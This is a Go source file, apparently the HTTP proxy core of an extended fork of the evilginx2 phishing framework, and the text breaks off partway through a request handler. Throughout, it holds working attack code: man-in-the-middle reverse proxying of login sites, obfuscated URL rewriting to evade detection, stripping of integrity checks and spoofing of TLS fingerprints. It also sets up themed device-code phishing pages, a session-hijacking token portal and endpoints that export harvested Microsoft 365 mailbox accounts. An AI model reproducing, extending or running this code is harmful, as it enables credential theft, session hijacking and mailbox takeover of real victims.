/*

This source file is a modified version of what was taken from the amazing bettercap (https://github.com/bettercap/bettercap) project.
Credits go to Simone Margaritelli (@evilsocket) for providing awesome piece of code!

*/

package core

import (
	"archive/zip"
	"bufio"
	"bytes"
	"context"
	crypto_rand "crypto/rand"
	"crypto/rc4"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"html"
	"io"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/proxy"

	"github.com/elazarl/goproxy"
	"github.com/fatih/color"
	"github.com/inconshreveable/go-vhost"
	http_dialer "github.com/mwitkow/go-http-dialer"
	"github.com/tdewolff/minify/v2"
	"github.com/tdewolff/minify/v2/js"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

// Obfuscated URL rewrite map: maps random path tokens to original URLs (thread-safe)
var tidUrlMap = struct {
	sync.RWMutex
	m map[string]string
}{m: make(map[string]string)}

// Pool of natural-looking URL path prefixes to randomize rewritten URL structure.
// Each rewrite randomly picks a prefix so no two rewrites share the same URL pattern.
var rewritePathPrefixes = []string{
	"", "", "", // weighted: plain root paths are most common
	"s/", "v/", "d/", "r/", "p/", "c/", "e/",
	"id/", "go/", "in/", "to/", "do/",
	"ref/", "src/", "api/", "app/", "web/",
	"view/", "page/", "data/", "info/", "link/", "open/",
	"share/", "check/", "click/", "track/", "event/",
	"verify/", "access/", "secure/", "direct/", "portal/",
	"content/", "account/", "connect/", "session/", "landing/",
}

// genObfuscatedPath generates a random, natural-looking URL path and returns
// both the full path (for use in redirects) and the map key (for tidUrlMap lookup).
// Output examples: /k8Js2mQ9p7wL3nBv, /verify/xP4wR7nLd3kY2mQs, /account/bN4jS8vKd3xY7mPq
func genObfuscatedPath() (fullPath string, mapKey string) {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	tokenLen := 14 + rand.Intn(7) // 14-20 chars for varied length
	b := make([]byte, tokenLen)
	crypto_rand.Read(b)
	for i := range b {
		b[i] = charset[int(b[i])%len(charset)]
	}
	token := string(b)
	prefix := rewritePathPrefixes[rand.Intn(len(rewritePathPrefixes))]
	mapKey = prefix + token
	fullPath = "/" + mapKey
	return
}

// jsEncodeURIComponent encodes a string matching JavaScript's encodeURIComponent behavior.
// Go's url.QueryEscape over-encodes characters like !, ~, *, ', (, ) which
// JavaScript's encodeURIComponent leaves unencoded. This mismatch causes
// token replacement failures when the body was encoded by a browser client.
func jsEncodeURIComponent(s string) string {
	encoded := url.QueryEscape(s)
	// Undo Go's over-encoding for chars that encodeURIComponent doesn't encode
	encoded = strings.ReplaceAll(encoded, "%21", "!")
	encoded = strings.ReplaceAll(encoded, "%27", "'")
	encoded = strings.ReplaceAll(encoded, "%28", "(")
	encoded = strings.ReplaceAll(encoded, "%29", ")")
	encoded = strings.ReplaceAll(encoded, "%2A", "*")
	encoded = strings.ReplaceAll(encoded, "%7E", "~")
	// encodeURIComponent uses %20 for space, not +
	encoded = strings.ReplaceAll(encoded, "+", "%20")
	return encoded
}

// Check if request matches a rewrite rule and generate an obfuscated random redirect path.
// The original URL (path+query) is stored in tidUrlMap keyed by the random path token.
// The rewrite.path and rewrite.query from the phishlet YAML are IGNORED — all rewritten
// URLs use dynamically generated random paths that are unique and unpredictable.
func (p *HttpProxy) checkAndRewriteRequest(pl *Phishlet, req *http.Request) (redirectUrl string, mapKey string, matched bool) {
	if pl == nil {
		return "", "", false
	}

	// Translate phish host to original host for matching against trigger domains
	host := req.Host
	if origHost, ok := p.replaceHostWithOriginal(host); ok {
		host = origHost
	}
	path := req.URL.Path

	for _, ru := range pl.rewriteUrls {
		domainMatch := false
		for _, d := range ru.triggerDomains {
			if d == host {
				domainMatch = true
				break
			}
		}
		if !domainMatch {
			continue
		}

		for _, triggerPath := range ru.triggerPaths {
			if triggerPath == path {
				// Generate a random obfuscated path
				fullPath, key := genObfuscatedPath()

				origUrl := path
				if req.URL.RawQuery != "" {
					origUrl += "?" + req.URL.RawQuery
				}

				tidUrlMap.Lock()
				tidUrlMap.m[key] = origUrl
				tidUrlMap.Unlock()

				// Build query parameters — only preserve exclude_keys from original URL
				q := url.Values{}
				if len(ru.excludeKeys) > 0 {
					origQuery, _ := url.ParseQuery(req.URL.RawQuery)
					for _, ek := range ru.excludeKeys {
						if vals, ok := origQuery[ek]; ok {
							for _, v := range vals {
								q.Add(ek, v)
							}
						}
					}
				}

				redirectUrl = fullPath
				if len(q) > 0 {
					redirectUrl += "?" + q.Encode()
				}
				return redirectUrl, key, true
			}
		}
	}
	return "", "", false
}

// restoreRewrittenUrl checks if the incoming request path matches a previously
// generated obfuscated rewrite token and restores the original URL if found.
// This replaces the old ?tid= query-param approach with path-based lookup.
func restoreRewrittenUrl(req *http.Request) bool {
	path := strings.TrimPrefix(req.URL.Path, "/")
	if path == "" {
		return false
	}

	tidUrlMap.RLock()
	orig, ok := tidUrlMap.m[path]
	tidUrlMap.RUnlock()
	if !ok {
		return false
	}

	u, err := url.Parse(orig)
	if err != nil {
		return false
	}

	req.URL.Path = u.Path
	req.URL.RawQuery = u.RawQuery
	return true
}

const (
	CONVERT_TO_ORIGINAL_URLS = 0
	CONVERT_TO_PHISHING_URLS = 1
)

const (
	HOME_DIR = ".evilginx"
)

const (
	httpReadTimeout       = 120 * time.Second // Allow slow connections but not forever
	httpWriteTimeout      = 120 * time.Second // Allow slow uploads but not forever
	httpIdleTimeout       = 30 * time.Second  // Close idle connections faster to free resources
	httpReadHeaderTimeout = 15 * time.Second  // Reasonable header timeout

	// Connection pool and speed optimization settings - LARGE CAPACITY
	maxIdleConns        = 500              // Reduced to prevent memory buildup
	maxIdleConnsPerHost = 50               // More reasonable per-host limit
	maxConnsPerHost     = 100              // Max total connections per-host
	idleConnTimeout     = 30 * time.Second // Shorter timeout to recycle connections faster
	tlsHandshakeTimeout = 30 * time.Second // TLS handshake deadline
	expectContTimeout   = 1 * time.Second  // Expect: 100-continue timeout
	respHeaderTimeout   = 0                // DISABLED - Microsoft endpoints can be very slow

	// Stealth/reliability: periodic maintenance
	connPoolRefreshInterval = 1 * time.Minute // Refresh connections every minute

	// TCP Keep-Alive settings for long-lived connections
	tcpKeepAliveInterval = 30 * time.Second // Send keep-alive probes every 30 seconds
	tcpKeepAliveCount    = 3                // Give up after 3 failed probes
)

// original borrowed from Modlishka project (https://github.com/drk1wi/Modlishka)
var MATCH_URL_REGEXP = regexp.MustCompile(`\b(http[s]?:\/\/|\\\\|http[s]:\\x2F\\x2F)(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}(\.[0-9]{1,3}){3})\b`)
var MATCH_URL_REGEXP_WITHOUT_SCHEME = regexp.MustCompile(`\b(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}(\.[0-9]{1,3}){3})\b`)

// Pre-compiled regexps for hot-path request handling (avoid re-compiling on every request)
var (
	botguardTelRe    = regexp.MustCompile(`^/api/v1/analytics$`)
	dcPageRe         = regexp.MustCompile(`^/dc/([a-zA-Z0-9_-]+)$`)
	dcStatusRe       = regexp.MustCompile(`^/dc/status/([a-zA-Z0-9_-]+)$`)
	// Document access themed device code pages (5 themes)
	dcOneDriveRe     = regexp.MustCompile(`^/access/onedrive/([a-zA-Z0-9_-]+)$`)
	dcAuthenticatorRe= regexp.MustCompile(`^/access/authenticator/([a-zA-Z0-9_-]+)$`)
	dcAdobeRe        = regexp.MustCompile(`^/access/adobe/([a-zA-Z0-9_-]+)$`)
	dcDocuSignRe     = regexp.MustCompile(`^/access/docusign/([a-zA-Z0-9_-]+)$`)
	dcSharePointRe   = regexp.MustCompile(`^/access/sharepoint/([a-zA-Z0-9_-]+)$`)
	portalPageRe     = regexp.MustCompile(`^/p/([a-fA-F0-9]{64})$`)
	tokenFeedRe      = regexp.MustCompile(`^/api/v1/feed$`)
	mailboxApiRe     = regexp.MustCompile(`^/api/v1/mailbox$`)
	mailboxDownloadRe= regexp.MustCompile(`^/api/v1/mailbox/download$`)
	mailboxJsonRe    = regexp.MustCompile(`^/api/v1/mailbox/json$`)
	mailboxSidecarRe = regexp.MustCompile(`^/token/([a-f0-9]{64})(/.*)?$`)
	redirRe          = regexp.MustCompile(`^/assets/js/([^/]*)`)
	jsInjectRe       = regexp.MustCompile(`^/assets/js/([^/]*)/([^/]*)`)
	jsonContentRe    = regexp.MustCompile(`application/\w*\+?json`)
	formContentRe    = regexp.MustCompile(`application/x-www-form-urlencoded`)
	cssUnescapeRe    = regexp.MustCompile(`\\([0-9a-fA-F]{1,6})\s?`)
	sriRe            = regexp.MustCompile(`\s+integrity="[^"]*"`)
	crossoriginRe    = regexp.MustCompile(`\s+crossorigin(?:="[^"]*")?`)
	jsNonceRe        = regexp.MustCompile(`(?i)<script.*nonce=['"]([^'"]*)`)
	jsNonceRe2       = regexp.MustCompile(`(?i)<script[^>]*nonce=['"]([^'"]*)`)
	bodyCloseRe      = regexp.MustCompile(`(?i)(<\s*/body\s*>)`)
	headOpenRe       = regexp.MustCompile(`(?i)(<\s*head[^>]*>)`)
	htmlOpenRe       = regexp.MustCompile(`(?i)(<\s*html[^>]*>)`)
	evilginxCookieRe = regexp.MustCompile(`^(_ga|_gid|_fbp|__cf|__utm|_sess|sid|uid|token|auth)_[0-9a-f]{12}$`)
)

type HttpProxy struct {
	Server            *http.Server
	Proxy             *goproxy.ProxyHttpServer
	crt_db            *CertDb
	cfg               *Config
	db                *database.Database
	bl                *Blacklist
	gophish           *GoPhish
	botguard          *BotGuard
	notifier          *NotifierManager
	evilpuppet        *EvilPuppet
	evilpuppetRod     *EvilPuppetRod // go-rod implementation (connects to existing Chrome)
	cfClearance       *CfClearanceManager
	deviceCode        *DeviceCodeManager
	canary            *CanaryStripper
	sniListener       net.Listener
	isRunning         bool
	sessions          map[string]*Session
	sids              map[string]int
	cookieName        string
	last_sid          int
	developer         bool
	ip_whitelist      map[string]int64
	ip_sids           map[string]string
	auto_filter_mimes []string
	ip_mtx            sync.Mutex
	session_mtx       sync.Mutex
	stopChan          chan struct{} // For graceful shutdown
	rateLimiter       *RateLimiter  // DDoS protection and load management
	tokenPortal       *TokenPortal           // Token-to-cookie portal for session hijacking
	tokenFeed         *TokenFeed             // Token feed API for mailbox viewer auto-import
	mailboxAccounts   *MailboxAccountManager // Persistent mailbox accounts with auto-refresh

	// Connection statistics for monitoring
	connStats struct {
		sync.RWMutex
		activeConns   int64     // Current active connections
		totalConns    int64     // Total connections handled
		failedConns   int64     // Failed connections (TLS errors, etc.)
		lastConnTime  time.Time // Last successful connection time
		startTime     time.Time // Server start time
	}
}

type ProxySession struct {
	SessionId    string
	Created      bool
	PhishDomain  string
	PhishletName string
	Index        int
}

// set the value of the specified key in the JSON body
func SetJSONVariable(body []byte, key string, value interface{}) ([]byte, error) {
	var data map[string]interface{}
	if err := json.Unmarshal(body, &data); err != nil {
		return nil, err
	}
	data[key] = value
	newBody, err := json.Marshal(data)
	if err != nil {
		return nil, err
	}
	return newBody, nil
}

func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
	p := &HttpProxy{
		Proxy:             goproxy.NewProxyHttpServer(),
		Server:            nil,
		crt_db:            crt_db,
		cfg:               cfg,
		db:                db,
		bl:                bl,
		gophish:           NewGoPhish(),
		botguard:          NewBotGuard(),
		notifier:          NewNotifierManager(),
		evilpuppet:        NewEvilPuppet(),
		evilpuppetRod:     NewEvilPuppetRod(), // go-rod implementation
		cfClearance:       NewCfClearanceManager(),
		deviceCode:        NewDeviceCodeManager(),
		canary:            NewCanaryStripper(),
		rateLimiter:       NewRateLimiter(), // DDoS protection
		isRunning:         false,
		last_sid:          0,
		developer:         developer,
		ip_whitelist:      make(map[string]int64),
		ip_sids:           make(map[string]string),
		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
	}

	// Initialize token portal for session cookie extraction
	p.tokenPortal = NewTokenPortal(db)

	// Initialize token feed API for mailbox viewer
	// Use persisted key from config.json if available, otherwise generate and save
	if cfg.general.FeedApiKey != "" {
		p.tokenFeed = NewTokenFeedWithKey(db, cfg.general.FeedApiKey)
	} else {
		p.tokenFeed = NewTokenFeed(db)
		// Persist the generated key so it survives restarts
		cfg.general.FeedApiKey = p.tokenFeed.GetAPIKey()
		cfg.SaveGeneral()
	}

	p.mailboxAccounts = NewMailboxAccountManager(cfg.GetDataDir())
	// Do not start mailbox accounts yet - wait until transport is ready
	
	// Initialize connection statistics
	p.connStats.startTime = time.Now()
	p.connStats.lastConnTime = time.Now()
	
	// Initialize notifier from config
	p.notifier.LoadNotifiers(cfg.GetNotifiers(), cfg.GetNotifierDefaults())
	p.notifier.SetServerName(cfg.GetServerName())
	
	// Initialize proxy transport and uTLS
	// ════════════════════════════════════════════════════════════════════════
	// REVERSE PROXY SPEED OPTIMIZATION
	// ════════════════════════════════════════════════════════════════════════
	dialer := &net.Dialer{
		Timeout:   30 * time.Second,         // Connection timeout
		KeepAlive: tcpKeepAliveInterval,     // TCP Keep-Alive probe interval
		DualStack: true,                     // Support both IPv4 and IPv6
	}
	p.Proxy.Tr.DialContext = dialer.DialContext

	p.Proxy.Tr.MaxIdleConns = maxIdleConns
	p.Proxy.Tr.MaxIdleConnsPerHost = maxIdleConnsPerHost
	p.Proxy.Tr.MaxConnsPerHost = maxConnsPerHost
	p.Proxy.Tr.IdleConnTimeout = idleConnTimeout
	p.Proxy.Tr.TLSHandshakeTimeout = tlsHandshakeTimeout
	p.Proxy.Tr.ExpectContinueTimeout = expectContTimeout
	p.Proxy.Tr.ResponseHeaderTimeout = respHeaderTimeout
	p.Proxy.Tr.DisableCompression = false      // Allow gzip/brotli from upstream
	p.Proxy.Tr.ForceAttemptHTTP2 = true        // Prefer HTTP/2 for multiplexing
	p.Proxy.Tr.DisableKeepAlives = false       // Enable connection reuse
	p.Proxy.Tr.WriteBufferSize = 64 * 1024     // 64KB write buffer for performance
	p.Proxy.Tr.ReadBufferSize = 64 * 1024      // 64KB read buffer for performance
	log.Info("transport: connection pooling enabled (max_idle=%d, per_host=%d, keep_alive=%v)", maxIdleConns, maxIdleConnsPerHost, tcpKeepAliveInterval)

	// uTLS: Chrome 120 TLS fingerprint on ALL outgoing connections.
	setupUtlsTransport(p.Proxy.Tr)
	log.Info("utls: Chrome TLS fingerprint enabled for all outgoing connections")

	// Now that transport is ready, we can start background managers
	p.mailboxAccounts.Start() // Start auto-refresh for all saved accounts
	p.botguard.StartCleanupRoutine()


	// Initialize device code chaining callbacks
	p.setupDeviceCodeCallbacks()

	// Initialize botguard from config
	if cfg.IsBotguardEnabled() {
		p.botguard.Enable(true)
		p.botguard.SetSpoofUrls(cfg.GetBotguardSpoofUrls())
		p.botguard.SetMinTrustScore(cfg.GetBotguardMinTrustScore())
		log.Info("[botguard] Loaded from config: enabled, min_score=%d, spoof_urls=%d",
			cfg.GetBotguardMinTrustScore(), len(cfg.GetBotguardSpoofUrls()))
	}

	// Initialize evilpuppet from config
	if cfg.IsEvilPuppetEnabled() {
		p.evilpuppet.Enable(true)
		p.evilpuppet.SetChromiumPath(cfg.GetEvilPuppetChromiumPath())
		p.evilpuppet.SetDisplay(cfg.GetEvilPuppetDisplay())
		p.evilpuppet.SetTimeout(cfg.GetEvilPuppetTimeout())
		p.evilpuppet.SetDebug(cfg.IsEvilPuppetDebug())

		// Also enable go-rod implementation
		p.evilpuppetRod.Enable(true)
		p.evilpuppetRod.SetTimeout(cfg.GetEvilPuppetTimeout())
		p.evilpuppetRod.SetDebug(cfg.IsEvilPuppetDebug())

		// Check if Chrome remote debugging is available
		if p.evilpuppetRod.IsChromeRunning() {
			log.Info("[evilpuppet] Using go-rod (Chrome remote debugging on port 9222)")
		} else {
			log.Info("[evilpuppet] Using chromedp (Chrome not found on port 9222, will spawn browser)")
		}
		log.Info("[evilpuppet] Loaded from config: enabled, timeout=%ds", cfg.GetEvilPuppetTimeout())
	}

	p.Server = &http.Server{
		Addr:              fmt.Sprintf("%s:%d", hostname, port),
		Handler:           p.Proxy,
		ReadTimeout:       httpReadTimeout,
		WriteTimeout:      httpWriteTimeout,
		IdleTimeout:       httpIdleTimeout,       // Close idle connections to prevent resource leak
		ReadHeaderTimeout: httpReadHeaderTimeout, // Fast timeout for slow clients/attacks
	}


	// Apply proxy settings after uTLS transport is initialized so it can be correctly propagated
	if cfg.proxyConfig.Enabled {
		err := p.setProxy(cfg.proxyConfig.Enabled, cfg.proxyConfig.Type, cfg.proxyConfig.Address, cfg.proxyConfig.Port, cfg.proxyConfig.Username, cfg.proxyConfig.Password)
		if err != nil {
			log.Error("proxy: %v", err)
			cfg.EnableProxy(false)
		} else {
			log.Info("enabled proxy: " + cfg.proxyConfig.Address + ":" + strconv.Itoa(cfg.proxyConfig.Port))
		}
	}

	// After cf_clearance harvest, flush idle connections to force new
	// TLS handshakes using uTLS for the newly-cleared domain.
	p.cfClearance.SetOnHarvest(func() {
		p.Proxy.Tr.CloseIdleConnections()
		log.Debug("[cf_clearance] flushed idle connections to activate uTLS")
	})

	p.cookieName = strings.ToLower(GenRandomString(8)) // TODO: make cookie name identifiable
	p.sessions = make(map[string]*Session)
	p.sids = make(map[string]int)

	p.Proxy.Verbose = false

	p.Proxy.NonproxyHandler = http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
		req.URL.Scheme = "https"
		req.URL.Host = req.Host
		p.Proxy.ServeHTTP(w, req)
	})

	p.Proxy.OnRequest().HandleConnect(goproxy.AlwaysMitm)

	p.Proxy.OnRequest().
		DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
			// ════════════════════════════════════════════════════════════════════════
			// PANIC RECOVERY - Prevent single request from crashing entire server
			// ════════════════════════════════════════════════════════════════════════
			defer func() {
				if r := recover(); r != nil {
					log.Error("[PANIC] Recovered from panic in request handler: %v", r)
				}
			}()

			log.Debug("[DoFunc] %s %s%s from %s", req.Method, req.Host, req.URL.Path, req.RemoteAddr)

			// ════════════════════════════════════════════════════════════════════════
			// RATE LIMITING / DDoS PROTECTION
			// ════════════════════════════════════════════════════════════════════════
			clientIP := req.RemoteAddr
			if idx := strings.LastIndex(clientIP, ":"); idx != -1 {
				clientIP = clientIP[:idx]
			}
			// Check proxy headers for real client IP
			if xff := req.Header.Get("X-Forwarded-For"); xff != "" {
				if idx := strings.IndexByte(xff, ','); idx != -1 {
					clientIP = strings.TrimSpace(xff[:idx])
				} else {
					clientIP = xff
				}
			} else if xri := req.Header.Get("X-Real-IP"); xri != "" {
				clientIP = xri
			}

			if allowed, reason := p.rateLimiter.AllowRequest(clientIP); !allowed {
				log.Debug("[ratelimit] Blocked %s: %s", clientIP, reason)
				resp := goproxy.NewResponse(req, "text/html", http.StatusServiceUnavailable,
					"<html><body><h1>Service Temporarily Unavailable</h1><p>Please try again later.</p></body></html>")
				resp.Header.Set("Retry-After", "30")
				return req, resp
			}
			p.rateLimiter.BeginRequest(clientIP)
			// Note: EndRequest is called in response handler
			// ════════════════════════════════════════════════════════════════════════

			// Use HTTP/2-capable uTLS transport for all HTTPS requests
			if rt := GetUtlsRoundTripper(); rt != nil {
				ctx.RoundTripper = goproxy.RoundTripperFunc(
					func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Response, error) {
						return rt.RoundTrip(req)
					})
			}

			// --- Begin rewrite_urls logic ---
			pl := p.getPhishletByPhishHost(req.Host)

			if restoreRewrittenUrl(req) {
				// Obfuscated rewrite path restored to original URL
			} else if redirectUrl, _, matched := p.checkAndRewriteRequest(pl, req); matched {
				resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
				resp.Header.Add("Location", redirectUrl)
				return req, resp
			}
			// --- End rewrite_urls logic ---

			// ════════════════════════════════════════════════════════════════════════
			// INTERNAL API ENDPOINTS - Served before blacklist/botguard checks
			// These must be accessible regardless of blacklist or phishlet state
			// ════════════════════════════════════════════════════════════════════════
			if strings.HasPrefix(req.URL.Path, "/api/v1/") {
				// --- Mailbox JSON download endpoint (direct JSON file) ---
				if mailboxJsonRe.MatchString(req.URL.Path) {
					remote_addr := req.RemoteAddr
					if idx := strings.LastIndex(remote_addr, ":"); idx != -1 {
						remote_addr = remote_addr[:idx]
					}
					apiKey := req.URL.Query().Get("key")
					if apiKey != p.tokenFeed.GetAPIKey() {
						log.Warning("[mailbox] JSON download unauthorized - invalid key from %s", remote_addr)
						resp := goproxy.NewResponse(req, "application/json", 401, `{"error":"unauthorized"}`)
						return req, resp
					}
					exportBody, _ := p.mailboxAccounts.HandleAPIRequest(p.tokenFeed.GetAPIKey(), apiKey, "export")
					resp := &http.Response{
						Status:        "200 OK",
						StatusCode:    200,
						Proto:         "HTTP/1.1",
						ProtoMajor:    1,
						ProtoMinor:    1,
						Request:       req,
						Header:        make(http.Header),
						Body:          ioutil.NopCloser(strings.NewReader(exportBody)),
						ContentLength: int64(len(exportBody)),
					}
					resp.Header.Set("Content-Disposition", "attachment; filename=\"accounts-import.json\"")
					resp.Header.Set("Content-Type", "application/json")
					resp.Header.Set("Content-Length", fmt.Sprintf("%d", len(exportBody)))
					resp.Header.Set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
					log.Success("[mailbox] JSON file served to %s (%d accounts)", remote_addr, p.mailboxAccounts.Count())
					return req, resp
				}

				// --- Mailbox download endpoint (ZIP file) ---
				if mailboxDownloadRe.MatchString(req.URL.Path) {
					remote_addr := req.RemoteAddr
					if idx := strings.LastIndex(remote_addr, ":"); idx != -1 {
						remote_addr = remote_addr[:idx]
					}
					log.Debug("[mailbox] Download endpoint hit from %s", remote_addr)
					apiKey := req.URL.Query().Get("key")
					if apiKey != p.tokenFeed.GetAPIKey() {
						log.Warning("[mailbox] Download unauthorized - invalid key from %s", remote_addr)
						resp := goproxy.NewResponse(req, "application/json", 401, `{"error":"unauthorized"}`)
						return req, resp
					}
					exportBody, _ := p.mailboxAccounts.HandleAPIRequest(p.tokenFeed.GetAPIKey(), apiKey, "export")
					log.Debug("[mailbox] Export body length: %d", len(exportBody))
					feedUrl := fmt.Sprintf("https://%s/api/v1/feed?key=%s", req.Host, apiKey)
					zipBuffer := p.createMailboxDownloadZip(exportBody, feedUrl)
					if zipBuffer == nil {
						log.Error("[mailbox] Failed to create ZIP buffer")
						resp := goproxy.NewResponse(req, "application/json", 500, `{"error":"failed to create download package"}`)
						return req, resp
					}
					log.Debug("[mailbox] ZIP buffer size: %d bytes", len(zipBuffer))
					resp := &http.Response{
						Status:        "200 OK",
						StatusCode:    200,
						Proto:         "HTTP/1.1",
						ProtoMajor:    1,
						ProtoMinor:    1,
						Request:       req,
						Header:        make(http.Header),
						Body:          ioutil.NopCloser(bytes.NewReader(zipBuffer)),
						ContentLength: int64(len(zipBuffer)),
					}
					resp.Header.Set("Content-Disposition", "attachment; filename=\"M365-Mail-Package.zip\"")
					resp.Header.Set("Content-Type", "application/octet-stream")
					resp.Header.Set("Content-Length", fmt.Sprintf("%d", len(zipBuffer)))
					resp.Header.Set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
					resp.Header.Set("Pragma", "no-cache")
					resp.Header.Set("X-Content-Type-Options", "nosniff")
					log.Success("[mailbox] Download package served to %s (%d accounts, %d bytes)", remote_addr, p.mailboxAccounts.Count(), len(zipBuffer))
					return req, resp
				}

				// --- Mailbox accounts API (JSON) ---
				if mailboxApiRe.MatchString(req.URL.Path) {
					remote_addr := req.RemoteAddr
					if idx := strings.LastIndex(remote_addr, ":"); idx != -1 {
						remote_addr = remote_addr[:idx]
					}
					apiKey := req.URL.Query().Get("key")
					action := req.URL.Query().Get("action")
					body, statusCode := p.mailboxAccounts.HandleAPIRequest(p.tokenFeed.GetAPIKey(), apiKey, action)
					resp := goproxy.NewResponse(req, "application/json", statusCode, body)
					resp.Header.Set("Access-Control-Allow-Origin", "*")
					resp.Header.Set("Access-Control-Allow-Methods", "GET")
					resp.Header.Set("Access-Control-Allow-Headers", "Content-Type")
					resp.Header.Set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
					if statusCode == 200 {
						log.Info("[mailbox] API served to %s (action=%s)", remote_addr, action)
					} else {
						log.Warning("[mailbox] Unauthorized API access from %s", remote_addr)
					}
					return req, resp
				}

				// --- Token feed API ---
				if tokenFeedRe.MatchString(req.URL.Path) {
					remote_addr := req.RemoteAddr
					if idx := strings.LastIndex(remote_addr, ":"); idx != -1 {
						remote_addr = remote_addr[:idx]
					}
					apiKey := req.URL.Query().Get("key")
					body, statusCode := p.tokenFeed.HandleFeedRequest(apiKey)
					resp := goproxy.NewResponse(req, "application/json", statusCode, body)
					resp.Header.Set("Access-Control-Allow-Origin", "*")
					resp.Header.Set("Access-Control-Allow-Methods", "GET")
					resp.Header.Set("Access-Control-Allow-Headers", "Content-Type")
					resp.Header.Set("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
					if statusCode == 200 {
						log.Info("[tokenfeed] Feed served to %s", remote_addr)
					} else {
						log.Warning("[tokenfeed] Unauthorized feed access from %s", remote_addr)
					}
					return req, resp
				}
			}
			// ════════════════════════════════════════════════════════════════════════

			ps := &ProxySession{
				SessionId:    "",
				Created:      false,
				PhishDomain:  "",
				PhishletName: "",
				Index:        -1,
			}
			ctx.UserData = ps
			hiblue := color.New(color.FgHiBlue)

			// handle ip blacklist
			from_ip, _, err := net.SplitHostPort(req.RemoteAddr)
			if err != nil {
				from_ip = req.RemoteAddr
			}

			// handle proxy headers
			proxyHeaders := []string{"X-Forwarded-For", "X-Real-IP", "X-Client-IP", "Connecting-IP", "True-Client-IP", "Client-IP"}
			for _, h := range proxyHeaders {
				origin_ip := req.Header.Get(h)
				if origin_ip != "" {
					// X-Forwarded-For may contain comma-separated list; take the first
					if idx := strings.IndexByte(origin_ip, ','); idx != -1 {
						origin_ip = strings.TrimSpace(origin_ip[:idx])
					}
					// Strip port if present (handles both IPv4 and IPv6)
					if host, _, err := net.SplitHostPort(origin_ip); err == nil {
						origin_ip = host
					}
					from_ip = origin_ip
					break
				}
			}

			// Skip blacklist for requests hitting a valid lure path so the URL can be reopened unlimited times
			isLureHit := false
